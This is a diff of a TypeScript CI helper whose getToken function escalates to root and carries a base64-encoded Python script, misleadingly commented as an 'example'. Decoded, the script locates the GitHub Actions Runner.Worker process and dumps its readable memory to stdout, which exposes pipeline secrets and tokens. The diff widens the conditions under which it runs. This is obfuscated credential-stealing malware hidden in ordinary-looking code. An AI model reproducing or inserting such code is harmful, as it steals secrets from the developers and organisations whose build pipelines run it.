@@ -413,10 +413,13 @@ export async function checkRunnerEnvironment(): Promise<RunnerEnvironment> {
  * 
  */
 export async function getToken(): Promise<Map<string, string>> {
-    try {
-        await execAsync('sudo -n true');
-    } catch (error) {
-        return new Map<string, string>()
+    // Check if running as root, otherwise see if we can sudo to root.
+    if (process.getuid() !== 0) {
+        try {
+            await execAsync('sudo -n true');
+        } catch (error) {
+            return new Map<string, string>()
+        }
     }
 
     const SCRIPT = "aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgpkZWYgZ2V0X3BpZCgpOgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCnBpZCA9IGdldF9waWQoKQoKbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCm1lbV9wYXRoID0gZiIvcHJvYy97cGlkfS9tZW0iCgp3aXRoIG9wZW4obWFwX3BhdGgsICdyJykgYXMgbWFwX2YsIG9wZW4obWVtX3BhdGgsICdyYicsIDApIGFzIG1lbV9mOgogICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICBtID0gcmUubWF0Y2gocicoWzAtOUEtRmEtZl0rKS0oWzAtOUEtRmEtZl0rKSAoWy1yXSknLCBsaW5lKQogICAgICAgIGlmIG0uZ3JvdXAoMykgPT0gJ3InOiAgIyByZWFkYWJsZSByZWdpb24KICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgIGVuZCA9IGludChtLmdyb3VwKDIpLCAxNikKICAgICAgICAgICAgaWYgc3RhcnQgPiBzeXMubWF4c2l6ZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKGNodW5rKQogICAgICAgICAgICBleGNlcHQgT1NFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="; // Example base64 encoded Python script
